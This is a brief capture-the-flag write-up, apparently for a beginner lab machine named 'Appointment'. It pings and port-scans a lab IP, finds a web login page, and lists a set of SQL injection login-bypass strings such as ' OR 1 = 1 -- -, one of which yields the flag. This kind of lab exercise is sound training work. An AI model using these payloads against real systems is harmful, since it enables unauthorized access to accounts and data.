![Appointment.jpg](/assets/appointment.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 2 10.129.208.7
```

2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.208.7
```

**Output**
``` bash
PORT   STATE SERVICE
80/tcp open  http
```


3. Access to web page in the browser
![Web.PNG](/assets/appointment-web.PNG)


4. Out goal is broke the web page with **Sql Injection**

**Try with**

`' OR '1`

`' OR 1 -- -`

`" OR "" = "`

`" OR 1 = 1 -- -`

`' OR '' = '`

`'='`

`'LIKE'`

`'=0--+`

` OR 1=1`

`' OR 'x'='x`

`' AND id IS NULL; --`


5. With this `' OR 1 = 1 -- -` 

![Sql_Injection.PNG](/assets/appointment-web2.PNG)

6. And BOOM!
![Flag](/assets/appointment-flag.PNG)


**By: Est**